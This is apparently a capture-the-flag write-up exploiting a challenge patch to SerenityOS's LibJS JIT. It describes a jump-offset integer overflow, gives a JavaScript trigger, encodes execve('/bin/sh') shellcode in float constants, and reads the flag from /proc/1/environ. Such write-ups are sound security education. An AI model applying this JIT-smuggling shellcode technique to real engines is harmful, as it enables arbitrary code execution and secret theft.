# Hop
## SerenityOS LibJS JIT pwn

### Patch

The provided patch adds an 'optimization' to the Serenity LibJIT compiler (used by the JS engine when the env var LIBJS_JIT is set).
When codegenning jumps, if the the offset between the current instruction and the target is within the range of a signed 8 bit int,
it will be encoded as a short jump (followed by a 3 byte nop lol).

### Bug

After the offset is checked, 3 is added to it account for the smaller instruction requiring a bigger jump. If `offset` is 125, 126 or 127, adding 3 will overflow,
causing it to become negative. This allows us to insert arbritrary control flow.

### Exploit

With some experimentation, we can generate a series of operations that both trigger the overflow and causes control flow to fall into a controllable location.

There are probably many sequences that work here, but I found a `switch` with a single (not-taken) case with lots of padding and a `default` (taken) with a small amount of padding and a `break`.

The `break` attempts to short jump to the end of the `switch` construct but instead overflows, falling back to within it. In this case it falls back to the middle of a value we control, a float.

```js
switch (2) {
    case 1:
        0xaa; 0xbb; 0xcc;
        5.896445725132126e-306;
        0xdd; 0xee; "pad"; "pad";
        break;
    default:
        "pad"; typeof([0xff]);
        break;
}
```

This float will compile to a `movabs $reg, <controlled value>`, and our `break` will jump to the bytes at the start of the controlled value. When disassembled, this is a `jmp +0x114; nop; nop; nop` which jumps over our `switch` block and into the middle of another later float.

### Shellcoding

We can now write arbritrary shellcode - each instruction must be at most 6 bytes, followed by a `jmp +6` to the next instruction. I have included a [script](solve/encode.py) to encode the following:

```py
mov edi, "/bin"             ; edi = "/bin"
mov edx, "/sh\x00"          ; edx = "/sh\x00"
shl rdx, 32; nop            ; rdx = "/bin\x00\x00\x00\x00"
or rdi, rdx; push rdi; nop  ; push(rdi = '/bin/sh\x00'); 
mov rdi, rsp; xor eax, eax  ; rdi = "/bin/sh\x00", eax = 0
mov al, 59; xor esi, esi    ; al = SYS_execve, esi = NULL
xor edx, edx; syscall       ; syscall(SYS_execve, "/bin/sh\x00", NULL, NULL)
```

The flag is in an environment variable, but we passed `NULL` so the environment is not inherited. We can just `cat /proc/1/environ` in Docker to read the initial env vars including the flag.
